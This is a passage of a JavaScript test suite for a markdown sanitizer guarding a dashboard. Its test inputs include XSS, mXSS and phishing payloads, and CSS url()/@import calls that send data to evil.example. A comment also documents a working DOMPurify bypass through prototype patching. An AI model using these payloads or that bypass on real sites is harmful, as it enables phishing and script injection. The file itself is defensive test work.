// Sanitizer tests for the real exported renderMarkdown.
//
// Task descriptions and comment bodies are mirrored verbatim from third-party
// sources (GitHub issue and comment bodies), so renderMarkdown is the security
// boundary between attacker-controlled markdown and the dashboard DOM. These
// tests pin that boundary: the payloads below must stay neutralised across any
// future change to the sanitizer configuration.
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';
import { JSDOM } from 'jsdom';
// Deliberate version skew, do not "fix" blindly: package.json declares
// jsdom@^26.1.0 but @types/jsdom@^28.0.3. DefinitelyTyped publishes no types for
// jsdom 22-26 (its version list jumps 21.1.7 -> 27.0.0), and jsdom ships none of
// its own, so no matching major exists to pin to. 28.0.3 is `latest` and covers
// the two APIs used here (`new JSDOM(string)` and `.window`), both stable across
// all of these majors. jsdom is held at 26 because the component harness on the
// Phase 2 branch is built against it; renderMarkdown's output was verified
// byte-identical on 26.1.0 and 29.1.1 over a 95-payload corpus before pinning.
//
// DOMPurify binds to `globalThis.window` when its module is first evaluated, so
// a DOM has to exist before markdown.js (and its dompurify import) is loaded.
const dom = new JSDOM('');
const globals = globalThis;
globals.window = dom.window;
globals.document = dom.window.document;
const { renderMarkdown } = await import('./markdown.js');
const failures = [];
let checks = 0;
function check(name, fn) {
    checks += 1;
    try {
        fn();
    }
    catch (err) {
        failures.push(`${name}: ${err.message}`);
    }
}
function parse(html) {
    const host = dom.window.document.createElement('div');
    host.innerHTML = html;
    return host;
}
function assertNoElement(html, selector, message) {
    if (parse(html).querySelector(selector) !== null) {
        throw new Error(`${message}: found <${selector}> in ${JSON.stringify(html)}`);
    }
}
function assertElement(html, selector, message) {
    if (parse(html).querySelector(selector) === null) {
        throw new Error(`${message}: no <${selector}> in ${JSON.stringify(html)}`);
    }
}
function assertNotContains(html, needle, message) {
    if (html.toLowerCase().includes(needle.toLowerCase())) {
        throw new Error(`${message}: found ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
    }
}
function assertContains(html, needle, message) {
    if (!html.includes(needle)) {
        throw new Error(`${message}: missing ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
    }
}
function assertEqual(actual, expected, message) {
    if (actual !== expected) {
        throw new Error(`${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
    }
}
/** Fails if any element in the output carries an inline event handler. */
function assertNoEventHandlers(html, message) {
    for (const el of parse(html).querySelectorAll('*')) {
        for (const attr of el.attributes) {
            if (attr.name.toLowerCase().startsWith('on')) {
                throw new Error(`${message}: ${el.tagName} has ${attr.name} in ${JSON.stringify(html)}`);
            }
        }
    }
}
// ---------------------------------------------------------------------------
// 1. Phishing surface — issue #195. Form controls must not survive.
// ---------------------------------------------------------------------------
function formControls() {
    const phishing = renderMarkdown('<form action="https://evil.example"><input name=token type=password>' +
        '<button>Sign in</button></form>');
    check('form tag stripped', () => {
        assertNoElement(phishing, 'form', 'credential-phishing form survived');
    });
    check('form action attribute stripped', () => {
        assertNotContains(phishing, 'evil.example', 'attacker origin survived');
        assertNotContains(phishing, 'action', 'action attribute survived');
    });
    check('password input stripped', () => {
        assertNoElement(phishing, 'input', 'password field survived');
        assertNotContains(phishing, '<input', 'input tag survived');
    });
    check('submit button stripped', () => {
        assertNoElement(phishing, 'button', 'submit button survived');
    });
    check('select and option stripped', () => {
        const out = renderMarkdown('<select><option>a</option></select>');
        assertNoElement(out, 'select', 'select survived');
        assertNotContains(out, '<option', 'option survived');
    });
    check('textarea stripped', () => {
        const out = renderMarkdown('<textarea>x</textarea>');
        assertNoElement(out, 'textarea', 'textarea survived');
    });
    // Read this check's name literally: it asserts the TAG rule, not the attribute
    // rule. `formaction` is only valid on <button>/<input> and `action` only on
    // <form>, and all three tags are in FORBID_TAGS, so the host tag is stripped
    // before either attribute rule is ever consulted. Both FORBID_ATTR entries can
    // therefore be deleted with this suite fully green — they are deliberate
    // defence in depth and are not testable in isolation through renderMarkdown.
    // Keep them; do not infer from this check that they are covered.
    check('formaction cannot survive because its host tag is stripped', () => {
        const out = renderMarkdown('<button formaction="https://evil.example">go</button>');
        assertNotContains(out, 'formaction', 'formaction survived');
        assertNotContains(out, 'evil.example', 'attacker origin survived');
    });
}
// ---------------------------------------------------------------------------
// 2. Spoofing surface — audit findings LOW-1 (style) and LOW-2 (download).
// ---------------------------------------------------------------------------
function spoofingAttributes() {
    check('style attribute stripped', () => {
        const out = renderMarkdown('<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>');
        assertNotContains(out, 'style=', 'inline style survived');
        assertNotContains(out, 'position:fixed', 'overlay styling survived');
        assertContains(out, 'overlay', 'element content should be preserved');
    });
    check('download attribute stripped', () => {
        const out = renderMarkdown('<a href="https://x.example/f" download="invoice.pdf">dl</a>');
        assertNotContains(out, 'download', 'download attribute survived');
        assertContains(out, 'https://x.example/f', 'safe href should be preserved');
    });
    // A non-modal <dialog> gets `position: absolute` and an opaque
    // `background-color: Canvas` from the HTML Standard's default rendering, so it
    // is an overlay primitive that needs no style attribute to work.
    check('dialog stripped (no fake modal)', () => {
        const out = renderMarkdown('<dialog open>Enter your password</dialog>');
        assertNoElement(out, 'dialog', 'dialog survived');
        assertContains(out, 'Enter your password', 'content should be preserved');
    });
    // Both sinks inject this HTML inside a Lit shadow root that carries the
    // component's own stylesheet, so a surviving class would resolve against real
    // component CSS. This is the audit's verified forged-comment-header payload.
    check('class attribute stripped (no CSS-reuse forgery)', () => {
        const out = renderMarkdown('<div class="comment"><div class="comment-header">' +
            '<span class="comment-author">farmtable-admin</span>' +
            '<span class="comment-time">2 minutes ago</span></div>' +
            '<div class="comment-body">Your session expired.</div></div>');
        assertNotContains(out, 'class=', 'class attribute survived');
        assertNotContains(out, 'comment-header', 'component class name survived');
        assertContains(out, 'farmtable-admin', 'text content should be preserved');
    });
}
// ---------------------------------------------------------------------------
// 3. Script execution regressions. These already hold; pinned so that a future
//    configuration change cannot silently reopen script execution.
// ---------------------------------------------------------------------------
function scriptExecution() {
    check('script tag stripped', () => {
        const out = renderMarkdown('<script>alert(1)</script>');
        assertNoElement(out, 'script', 'script survived');
        assertNotContains(out, 'alert(1)', 'script body survived');
    });
    check('inline event handler stripped', () => {
        const out = renderMarkdown('<img src=x onerror=alert(1)>');
        assertNoEventHandlers(out, 'event handler survived');
        assertNotContains(out, 'onerror', 'onerror survived');
    });
    check('javascript: href stripped', () => {
        const out = renderMarkdown('[click](javascript:alert(1))');
        assertNotContains(out, 'javascript:', 'javascript: URL survived');
        assertContains(out, 'click', 'link text should be preserved');
    });
    check('data: html href stripped', () => {
        const out = renderMarkdown('[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
        assertNotContains(out, 'data:text/html', 'data: HTML URL survived');
    });
    check('iframe srcdoc stripped', () => {
        const out = renderMarkdown('<iframe srcdoc="<script>alert(1)</script>"></iframe>');
        assertNoElement(out, 'iframe', 'iframe survived');
        assertNotContains(out, 'srcdoc', 'srcdoc survived');
    });
    check('mXSS mglyph payload neutralised', () => {
        const out = renderMarkdown('<math><mtext><table><mglyph><style><!--</style><img title="-->' +
            '<img src=1 onerror=alert(1)>">');
        assertNoElement(out, 'img', 'mXSS img survived');
        assertNoEventHandlers(out, 'mXSS handler survived');
        assertNotContains(out, 'alert(1)', 'mXSS payload survived');
    });
    check('base tag stripped', () => {
        const out = renderMarkdown('<base href="https://evil.example/">');
        assertNoElement(out, 'base', 'base survived');
        assertNotContains(out, 'evil.example', 'base href survived');
    });
    check('meta refresh stripped', () => {
        const out = renderMarkdown('<meta http-equiv="refresh" content="0;url=https://evil.example">');
        assertNoElement(out, 'meta', 'meta survived');
        assertNotContains(out, 'evil.example', 'redirect target survived');
    });
    check('object and embed stripped', () => {
        const out = renderMarkdown('<object data="https://evil.example/x"></object><embed src="https://evil.example/y">');
        assertNoElement(out, 'object', 'object survived');
        assertNoElement(out, 'embed', 'embed survived');
        assertNotContains(out, 'evil.example', 'attacker origin survived');
    });
    check('style element stripped', () => {
        const out = renderMarkdown('<style>body{display:none}</style>');
        assertNoElement(out, 'style', 'style element survived');
        assertNotContains(out, 'display:none', 'style rules survived');
    });
    check('target attribute stripped (no tabnabbing)', () => {
        const out = renderMarkdown('<a href="https://x.example" target="_blank">x</a>');
        assertNotContains(out, 'target', 'target survived');
    });
}
// ---------------------------------------------------------------------------
// 3b. SVG. <svg> is in DOMPurify's default allowlist and survives, and SVG is
//     historically the richest bypass surface after MathML: foreignObject
//     re-enters the HTML namespace, the animation elements can retarget an
//     attribute at runtime, and xlink:href is a second URL channel that a naive
//     href-only check misses. All of these are neutralised today; pinned so a
//     configuration change cannot silently reopen them.
//
//     Note both assertion styles are used throughout, for the reason given at
//     the mXSS check above: a structural query alone can false-negative on
//     re-parse.
// ---------------------------------------------------------------------------
function svgSurface() {
    // foreignObject is an HTML integration point, so a form inside it is parsed in
    // the HTML namespace and would be a working phishing form if it survived.
    check('svg foreignObject cannot smuggle form controls', () => {
        const out = renderMarkdown('<svg><foreignObject><form action="https://evil.example">' +
            '<input name=token type=password></form></foreignObject></svg>');
        assertNoElement(out, 'form', 'form survived inside foreignObject');
        assertNoElement(out, 'input', 'password field survived inside foreignObject');
        assertNotContains(out, 'foreignobject', 'foreignObject survived');
        assertNotContains(out, 'evil.example', 'attacker origin survived');
    });
    check('svg script element stripped', () => {
        const out = renderMarkdown('<svg><script>alert(1)</script></svg>');
        assertNoElement(out, 'script', 'script survived inside svg');
        assertNotContains(out, 'alert(1)', 'script body survived');
    });
    check('svg event handler stripped', () => {
        const out = renderMarkdown('<svg onload=alert(1)><circle onclick=alert(2)></circle></svg>');
        assertNoEventHandlers(out, 'svg event handler survived');
        assertNotContains(out, 'onload', 'onload survived');
        assertNotContains(out, 'alert(', 'handler body survived');
    });
    // animate/set can rewrite another element's attribute after sanitization, so
    // they are a way to introduce a javascript: URL that was never in the markup.
    check('svg animation elements stripped', () => {
        const animate = renderMarkdown('<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>');
        assertNoElement(animate, 'animate', 'animate survived');
        assertNotContains(animate, 'attributename', 'animate attributeName survived');
        assertNotContains(animate, 'javascript:', 'animated javascript: URL survived');
        const set = renderMarkdown('<svg><set attributeName="href" to="javascript:alert(1)"></set></svg>');
        assertNoElement(set, 'set', 'set survived');
        assertNotContains(set, 'javascript:', 'animated javascript: URL survived');
    });
    // xlink:href is a separate attribute from href and needs its own coverage.
    check('svg xlink:href javascript URL stripped', () => {
        const out = renderMarkdown('<svg><a xlink:href="javascript:alert(1)"><text y="20">click</text></a></svg>');
        assertNotContains(out, 'javascript:', 'xlink javascript: URL survived');
        assertNotContains(out, 'xlink', 'xlink attribute survived');
        assertContains(out, 'click', 'link text should be preserved');
    });
    check('svg use element stripped', () => {
        const out = renderMarkdown('<svg><use href="#x"></use>' +
            '<use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="></use></svg>');
        assertNoElement(out, 'use', 'use survived');
        assertNotContains(out, 'data:image/svg+xml', 'data: URL reference survived');
    });
    check('svg image javascript URL stripped', () => {
        const out = renderMarkdown('<svg><image href="javascript:alert(1)"></image></svg>');
        assertNotContains(out, 'javascript:', 'image javascript: URL survived');
        assertNoEventHandlers(out, 'image event handler survived');
    });
    // DOMPurify strips <style> in the HTML namespace by default but allows it in
    // the SVG one, so this is the one place a <style> element can reach the shadow
    // root. Arbitrary CSS there outranks the forbidden inline style attribute: it
    // restyles the whole component, not one element.
    check('svg style element stripped (no CSS injection into the shadow root)', () => {
        const out = renderMarkdown('<svg><style>:host{position:fixed;top:0;left:0;width:100vw;height:100vh;' +
            'background:#fff;z-index:9999}</style></svg>');
        assertNoElement(out, 'style', 'style element survived inside svg');
        assertNotContains(out, 'position:fixed', 'overlay rule survived');
        assertNotContains(out, 'z-index', 'stacking rule survived');
    });
    // Distinct from the visual-spoofing case above: @import and url() in a rule
    // reach an attacker origin with no user interaction, so the fix has to be
    // pinned against the remote-fetch vector specifically and not just the
    // overlay one.
    check('svg style cannot reach an attacker origin', () => {
        const imported = renderMarkdown('<svg><style>@import url(https://evil.example/x.css);</style></svg>');
        assertNoElement(imported, 'style', 'style element survived');
        assertNotContains(imported, '@import', '@import survived');
        assertNotContains(imported, 'evil.example', 'remote stylesheet origin survived');
        const exfil = renderMarkdown('<svg><style>a[href^="https://internal"]{background:url(https://evil.example/leak)}' +
            '</style></svg>');
        assertNoElement(exfil, 'style', 'style element survived');
        assertNotContains(exfil, 'evil.example', 'exfiltration origin survived');
    });
    // The sinks wrap markdown in block containers, so a payload does not need a
    // top-level raw-HTML block to reach the sanitizer. These three are the cases
    // proving the <svg><style> fix is reachable through ordinary markdown, so they
    // are the most load-bearing of the round-2 security work.
    //
    // One check() per container, deliberately. These were previously three
    // payloads looped inside a single check(), which made them invisible to the
    // EXPECTED_CHECKS pin: emptying the list left the suite green at the same
    // total. Splitting them puts each payload under the check-total pin that
    // already exists and is already proven to fire, rather than introducing a
    // second, parallel length assertion that would itself need guarding.
    const assertSvgStyleStripped = (md) => {
        const out = renderMarkdown(md);
        assertNoElement(out, 'style', `style survived in ${JSON.stringify(md)}`);
        assertNotContains(out, 'display:none', `style rules survived in ${JSON.stringify(md)}`);
    };
    check('svg style stripped inside a markdown list', () => {
        assertSvgStyleStripped('- <svg><style>*{display:none}</style></svg>');
    });
    check('svg style stripped inside a blockquote', () => {
        assertSvgStyleStripped('> <svg><style>*{display:none}</style></svg>');
    });
    check('svg style stripped inside a table cell', () => {
        assertSvgStyleStripped('| a |\n| - |\n| <svg><style>*{display:none}</style></svg> |');
    });
}
// ---------------------------------------------------------------------------
// 4. Positive cases. A sanitizer that breaks ordinary rendering is its own
//    outage, so pin the shapes real task descriptions rely on.
// ---------------------------------------------------------------------------
function ordinaryMarkdown() {
    check('headings render', () => {
        assertEqual(renderMarkdown('# Title'), '<h1>Title</h1>\n', 'heading changed');
    });
    check('emphasis renders', () => {
        assertEqual(renderMarkdown('**bold** and _em_'), '<p><strong>bold</strong> and <em>em</em></p>\n', 'emphasis changed');
    });
    check('safe links render with href intact', () => {
        const out = renderMarkdown('[docs](https://example.com/docs)');
        assertElement(out, 'a[href="https://example.com/docs"]', 'safe link lost its href');
        assertContains(out, 'docs</a>', 'link text lost');
    });
    check('relative links render', () => {
        assertElement(renderMarkdown('[t](/tasks/1)'), 'a[href="/tasks/1"]', 'relative link lost');
    });
    // marked emits class="language-js" here; FORBID_ATTR strips it. Nothing in
    // this repo consumes that class (there is no syntax highlighter), so the loss
    // is cosmetically and functionally nil.
    check('code blocks render', () => {
        assertEqual(renderMarkdown('```js\nconst a = 1;\n```'), '<pre><code>const a = 1;\n</code></pre>\n', 'code block changed');
    });
    check('inline code escapes html', () => {
        const out = renderMarkdown('use `<form>` here');
        assertContains(out, '<code>&lt;form&gt;</code>', 'inline code lost its escaped content');
        assertNoElement(out, 'form', 'inline code produced a real form');
    });
    check('lists render', () => {
        assertEqual(renderMarkdown('- one\n- two\n'), '<ul>\n<li>one</li>\n<li>two</li>\n</ul>\n', 'list changed');
    });
    check('tables render', () => {
        const out = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |\n');
        assertElement(out, 'table', 'table lost');
        assertContains(out, '<th>a</th>', 'table header lost');
    });
    check('images with safe src render', () => {
        assertElement(renderMarkdown('![alt](https://example.com/i.png)'), 'img[src="https://example.com/i.png"]', 'safe image lost');
    });
    check('empty input renders empty', () => {
        assertEqual(renderMarkdown(''), '', 'empty markdown should render empty');
    });
}
// ---------------------------------------------------------------------------
// 5. Task lists. FORBID_TAGS strips marked's <input type=checkbox>, so
//    renderMarkdown substitutes an inert glyph. Pin that the checked and
//    unchecked states stay distinguishable, that the state is still exposed to
//    assistive technology, and that no input comes back.
// ---------------------------------------------------------------------------
function taskLists() {
    check('task list state survives without an input element', () => {
        const out = renderMarkdown('- [ ] todo\n- [x] done\n');
        assertNoElement(out, 'input', 'checkbox input survived');
        assertContains(out, '☐\uFE0E', 'unchecked state lost');
        assertContains(out, '☑\uFE0E', 'checked state lost');
        assertContains(out, 'todo', 'unchecked item text lost');
        assertContains(out, 'done', 'checked item text lost');
    });
    // The real <input type=checkbox> was announced with a checked/unchecked state;
    // the glyph only keeps that for screen readers via role + aria-label, so pin
    // both labels and their pairing with the right glyph.
    check('task list state is exposed to assistive technology', () => {
        const out = renderMarkdown('- [ ] todo\n- [x] done\n');
        assertElement(out, 'span[role="img"][aria-label="Completed"]', 'checked label lost');
        assertElement(out, 'span[role="img"][aria-label="Not completed"]', 'unchecked label lost');
        assertContains(out, '<span role="img" aria-label="Completed">☑\uFE0E</span>', 'checked pairing lost');
        assertContains(out, '<span role="img" aria-label="Not completed">☐\uFE0E</span>', 'unchecked pairing lost');
    });
    check('nested task lists keep their state', () => {
        const out = renderMarkdown('- [x] outer\n  - [ ] inner\n');
        assertNoElement(out, 'input', 'checkbox input survived');
        assertContains(out, '☑\uFE0E</span> outer', 'outer state lost');
        assertContains(out, '☐\uFE0E</span> inner', 'inner state lost');
    });
}
// ---------------------------------------------------------------------------
// 6. Sink binding. Everything above secures a function that nothing forces
//    anyone to call: drop the wrapper at either sink — `unsafeHTML(c.body)`
//    instead of `unsafeHTML(renderMarkdown(c.body))` — and every check above
//    still passes while the whole bug class is back.
//
//    Mechanism: a static scan of the source tree, not a rendering test. A
//    rendering test would be the stronger proof, but instantiating the two Lit
//    components needs custom elements, adopted stylesheets and the Shoelace and
//    gRPC imports they pull in, none of which this plain `node` runner has —
//    that is a vitest-and-a-component-harness change, which is the Phase 2
//    branch's job, not a six-file cleanup's. The static scan costs nothing, has
//    no dependencies, and catches the exact regression described. Its one real
//    weakness is the classic one for source scanning — passing vacuously because
//    it matched no files — so the file count and the sink count are both pinned
//    below, and locating the tree throws rather than returning empty.
//
//    Read the guarantees here narrowly, and read them as THREE mechanisms with
//    very different strength. They keep getting cited as one thing ("G1"), and
//    that conflation is what carried three rounds of evadable checks past
//    sign-off. They are named separately below and they fail with separately
//    worded messages.
//
//    (a) THE PER-FILE BINDING — closed world, and meant to be SOUND.
//        `sinkBindingViolations` holds each file in REQUIRED_SINKS to rules
//        about how `renderMarkdown` and `unsafeHTML` may be USED: imported
//        unaliased from the one module allowed to provide them, never re-bound
//        locally, and never named anywhere except immediately called. That is a
//        finite claim over an enumerated set of two files, so it can be
//        finished. Its bar is the amended criterion stated at the end of this
//        comment — innocent-looking regression, not an arbitrary committer.
//
//    (b) THE TREE-WIDE SCAN — open world, and a TRIPWIRE, NOT A PROOF.
//        BANNED_SINKS, the indirection ban and the call-site collection
//        enumerate spellings across all source files. A regex over source text
//        is a hand-rolled stand-in for the TypeScript module graph, and it
//        disagrees with the real language semantics on aliasing, re-export and
//        indirection: `unsafeHTML as raw` followed by `raw(x)` is the same sink
//        written in a form no `unsafeHTML(` pattern can see. Every review round
//        so far has found a spelling the previous one missed, and the next one
//        will too. A green result from (b) means "none of the listed forms is
//        present in the files that were scanned" — never "no raw sink exists".
//        Do not cite it as the latter; its failure messages will not let you.
//
//    (c) SANITIZER OWNERSHIP — closed world over an enumerated dependency list.
//        R8 and R9, see sanitizerOwnershipViolations. (a) proves the sink CALLS
//        the sanitizer. It does not prove the sanitizer still SANITIZES, and
//        that is a separate axis: two `DOMPurify.addHook` calls at module scope
//        in a sink file satisfied every rule in (a) and rendered
//        `<img src=x onerror=alert(1)><script>alert(2)</script>` raw. (c) denies
//        every file but the sanitizer the ability to name its dependencies.
//
//    Soundness therefore lives in (a) and (c), plus the follow-up issue for
//    type-aware lint (typescript-eslint over resolved symbols) and Trusted
//    Types. Those answer "does any expression in this program evaluate to the
//    raw directive" using the compiler's own scope analysis, which is the
//    question (b) is failing to ask. Extending (b) with more patterns is not a
//    route to (a).
//
//    WHAT THIS GUARD CLAIMS, AND WHAT IT DOES NOT
//    --------------------------------------------
//    The criterion this guard was originally built against — "no mutation of
//    the two REQUIRED_SINKS files can leave them rendering unsanitized while
//    the suite is green" — never named an adversary, and read literally it is
//    unsatisfiable by anything in this file. It demands a guard that holds
//    against someone who can land arbitrary code in those files, and that
//    person can also edit this guard. The amended claim:
//
//      This guard defends against INNOCENT-LOOKING REGRESSION at the two
//      enumerated sinks: aliasing, shadowing, re-homing, rebinding,
//      argument-shape drift, laundering through an unscanned file, and capture
//      of the sanitizer's own configuration. It does NOT defend against a
//      committer who can land arbitrary code. That adversary is answered by
//      code review, CSP and Trusted Types, not by a scan the same commit
//      could edit.
//
//    THE BOUNDARY OF THE TECHNIQUE: rules of this kind can own a NAME. They
//    cannot own an EFFECT. R8 could kill the `addHook` attack because the
//    attack had to NAME 'dompurify' and a rule can take that name away. The
//    known survivor below names nothing:
//
//      const origRemoveAttribute = Element.prototype.removeAttribute;
//      Element.prototype.removeAttribute = function (name: string): void {
//        if (String(name).startsWith('on')) return;
//        origRemoveAttribute.call(this, name);
//      };
//      const origRemoveChild = Node.prototype.removeChild;
//      Node.prototype.removeChild = function <T extends Node>(child: T): T {
//        if (child && child.nodeName === 'SCRIPT') return child;
//        return origRemoveChild.call(this, child) as T;
//      };
//
//    Placed in a REQUIRED_SINKS file this leaves the suite fully green and is
//    runtime-verified to defeat the sanitizer — DOMPurify strips attributes
//    with `removeAttribute` and nodes with `removeChild`:
//
//      before: "<p><img src=\"x\"></p>\n"
//      after : "<p><img src=\"x\" onerror=\"alert(1)\"><script>alert(2)</script></p>\n"
//
//    This is KNOWN, ACCEPTED AND DOCUMENTED, not an oversight. It is recorded
//    as V25 in the mutation vector table — reports/dev-195-vectors.json, with
//    its runtime-verified before/after and the reason it is accepted — so the
//    next reviewer meets it as disclosed prior art rather than rediscovering it
//    and rating it High. The same table records the other disclosed
//    limitations: indirect eval, computed globalThis access, new Function, and
//    the unresolved non-relative specifier. Do not close V25 by banning
//    `.prototype` assignment: the equivalents are unbounded (Object.
//    defineProperty, Object.assign, Reflect.defineProperty, setPrototypeOf,
//    __proto__, and non-prototype globals such as
//    document.implementation.createHTMLDocument), so such a ban would fake
//    coverage rather than provide it.
//
//    Observing the EFFECT instead of the name is the only closure, and it
//    requires LOADING the two sink modules and re-asserting the sanitizer
//    afterwards. That needs the component graph compiled, which is the Phase 2
//    component harness. It is ROUTED THERE, not dropped: V23 (the addHook
//    capture) and V25 (the prototype patch) are that harness's acceptance
//    vectors.
// ---------------------------------------------------------------------------
/**
 * The two components that mirror attacker-controlled markdown into a shadow
 * root. These are named explicitly because the tree-wide assertions further
 * down cannot distinguish "this file still routes through renderMarkdown" from
 * "this file no longer matches my regex" — a sink rewritten into an unmatched
 * form leaves the case list rather than failing a check. Reading each file by
 * path converts that silence into a `readFileSync` throw.
 *
 * Update deliberately: adding a sink here without a corresponding component, or
 * removing one that still exists, is a change to what this suite guarantees.
 */
const REQUIRED_SINKS = [
    'src/components/inspector/ft-inspector-comments.ts',
    'src/components/inspector/ft-inspector-desc.ts',
];
/**
 * Exact number of scannable source files under `src/`. Pinned, not a floor: the
 * previous floor of 10 sat under an actual count of 50, so forty files could
 * have stopped being scanned with no signal. This is the G7 check-total
 * rationale applied one level down — update it deliberately when a source file
 * is added or removed, never to make a red suite go green.
 */
const EXPECTED_SOURCE_FILES = 50;
/** Walks up from this module to the directory containing `src/util/markdown.ts`. */
function findWebRoot() {
    let dir = dirname(fileURLToPath(import.meta.url));
    for (let i = 0; i < 8; i += 1) {
        try {
            statSync(join(dir, 'src', 'util', 'markdown.ts'));
            return dir;
        }
        catch {
            const parent = dirname(dir);
            if (parent === dir)
                break;
            dir = parent;
        }
    }
    throw new Error('could not locate the web source tree from ' + import.meta.url);
}
// Extensions that cannot hold a raw-HTML sink. Everything else under `src/` is
// scanned.
//
// This is deliberately a DENYLIST. The previous allowlist ('.ts', '.tsx', '.js',
// '.mjs', '.cjs') was written to be "wider than what the tree contains today",
// but it still missed `.mts`, `.cts` and `.jsx` — and that gap was worse than an
// ordinary miss, because the filter runs BEFORE `files` is built, so such a file
// did not move the file-count pin either. There was no signal of any kind.
// Inverting the predicate makes "scanned" the default for whatever module
// extension this project adopts next, which is the property the allowlist's
// comment always claimed but could not deliver. "Not scanned" is
// indistinguishable from "clean" in the results, so the set of unscanned things
// must be the set we can argue about, not the set we happened to list.
const INERT_EXTENSIONS = [
    '.css', '.scss', '.json', '.svg', '.md', '.txt', '.html',
    '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.woff', '.woff2',
];
function isScannableSource(entry) {
    // Test files are excluded so that this file may name the banned identifiers in
    // prose. That exclusion is also why a raw sink in a `*.test.ts` file is
    // invisible here; test files are not bundled into the production build, which
    // is the whole of the argument for accepting it.
    if (/\.test\.[cm]?[jt]sx?$/.test(entry))
        return false;
    return !INERT_EXTENSIONS.some((ext) => entry.endsWith(ext));
}
function collectSourceFiles(dir, out) {
    for (const entry of readdirSync(dir)) {
        const full = join(dir, entry);
        if (statSync(full).isDirectory()) {
            collectSourceFiles(full, out);
        }
        else if (isScannableSource(entry)) {
            out.push(full);
        }
    }
}
// ---------------------------------------------------------------------------
// Source views. Every scan below runs over a derived view of the file, never
// over its raw bytes.
//
// The reason is not tidiness. A guard that rejects correct code gets deleted,
// and the person most likely to trip this one is the next developer writing a
// comment that explains it. Before this change, all of the following turned the
// suite red, in production files, with no raw sink anywhere:
//
//   // SECURITY: never import unsafeHTML as something else.
//   // Do not use document.write( here; use lit templating.
//   const ADVICE = 'never do el.innerHTML = userInput';
//   <!-- renderMarkdown sanitizes with DOMPurify before this HTML is injected. -->
//
// The last one is not hypothetical: it is a real line in
// ft-inspector-desc.ts, and the per-file rules below cannot be stated as
// "renderMarkdown may only appear immediately called" until it is stripped.
// ---------------------------------------------------------------------------
/**
 * Blanks inert text — line comments, block comments, HTML comments inside lit
 * templates, and (optionally) the contents of quoted string literals —
 * replacing each character with a space and preserving every newline, so line
 * numbers in failure messages still point at the real source line.
 *
 * Template literals are NOT treated as strings: `html`…`` bodies are live code
 * in this codebase and contain the real sinks. The scanner tracks `${…}`
 * interpolations with a stack so that quotes inside template text (`title="…"`,
 * an apostrophe in prose) are not mistaken for string delimiters.
 *
 * REGEX LITERALS ARE TRACKED, and that is not a nicety. The first version of
 * this function did not track them, on the reasoning that misreading one would
 * "fail toward blanking real code, i.e. toward a missed detection rather than a
 * false positive". That reasoning was wrong, and mutation testing proved it: a
 * missed detection was exactly the goal, and blanking real code was the exploit.
 * Both of these rendered attacker markup raw at the live sink with the suite
 * green at 59/59, because everything after the `//` — including the alias
 * itself — vanished from the guard's view:
 *
 *   const proto = /^https:\/\//.source; const rawHtml = unsafeHTML;
 *   const sep = /[\/\/]/.source;        const rawHtml = unsafeHTML;
 *
 * A `/` is therefore resolved in order: `//` and `/*` are always comments (no
 * regex may begin with either), then a regex literal if the previous
 * significant token cannot end an expression, then division. Character classes
 * and backslash escapes are honoured while skipping the literal, and the body
 * is blanked — a regex can never be a directive alias, and `/innerHTML\s*=/` in
 * production code should not trip a sink pattern.
 *
 * REMAINING RESIDUE, recorded rather than hidden: because quoted strings are
 * blanked for the per-file view, a reference assembled at runtime —
 * `(0, eval)('unsafeHTML')`, `globalThis[k]`, `new Function(...)` — is invisible
 * to these rules. That is not a refactor anyone performs by accident, it is not
 * reachable without the reviewer seeing `eval` in a component, and closing it
 * needs the compiler rather than a scanner. It is the strongest argument in this
 * file for the type-aware-lint follow-up.
 */
function stripInertText(src, opts) {
    const out = src.split('');
    const blank = (from, to) => {
        for (let i = from; i < to && i < out.length; i += 1) {
            if (out[i] !== '\n')
                out[i] = ' ';
        }
    };
    const modes = ['code'];
    const braces = [0];
    // Enough token context to tell a regex literal from a division operator: a
    // regex may only begin where an expression may begin.
    let prevSig = '';
    let prevWord = '';
    const noteToken = (ch) => {
        if (/\s/.test(ch))
            return;
        prevWord = /[A-Za-z0-9_$]/.test(ch) ? prevWord + ch : '';
        prevSig = ch;
    };
    const EXPR_START_CHARS = '(,=:[!&|?{};+-*%^~<>';
    const EXPR_START_WORDS = new Set([
        'return', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void',
        'case', 'do', 'else', 'yield', 'await', 'throw',
    ]);
    const regexMayStart = () => prevSig === '' || EXPR_START_CHARS.includes(prevSig) || EXPR_START_WORDS.has(prevWord);
    // Returns the index just past the closing `/`, or -1 if this is not a regex
    // literal after all (unterminated before end of line).
    const endOfRegexLiteral = (start) => {
        let j = start + 1;
        let inClass = false;
        while (j < src.length) {
            const ch = src[j];
            if (ch === '\\') {
                j += 2;
                continue;
            }
            if (ch === '\n')
                return -1;
            if (inClass) {
                if (ch === ']')
                    inClass = false;
                j += 1;
                continue;
            }
            if (ch === '[') {
                inClass = true;
                j += 1;
                continue;
            }
            if (ch === '/')
                return j + 1;
            j += 1;
        }
        return -1;
    };
    let i = 0;
    while (i < src.length) {
        const c = src[i];
        const d = src[i + 1];
        if (modes[modes.length - 1] === 'template') {
            if (c === '\\') {
                i += 2;
                continue;
            }
            if (c === '`') {
                modes.pop();
                i += 1;
                continue;
            }
            if (c === '$' && d === '{') {
                modes.push('code');
                braces.push(0);
                i += 2;
                continue;
            }
            if (c === '<' && src.startsWith('<!--', i)) {
                const end = src.indexOf('-->', i + 4);
                const to = end === -1 ? src.length : end + 3;
                blank(i, to);
                i = to;
                continue;
            }
            i += 1;
            continue;
        }
        if (c === '/' && d === '/') {
            const end = src.indexOf('\n', i);
            const to = end === -1 ? src.length : end;
            blank(i, to);
            i = to;
            continue;
        }
        if (c === '/' && d === '*') {
            const end = src.indexOf('*/', i + 2);
            const to = end === -1 ? src.length : end + 2;
            blank(i, to);
            i = to;
            continue;
        }
        if (c === '/' && regexMayStart()) {
            const end = endOfRegexLiteral(i);
            if (end !== -1) {
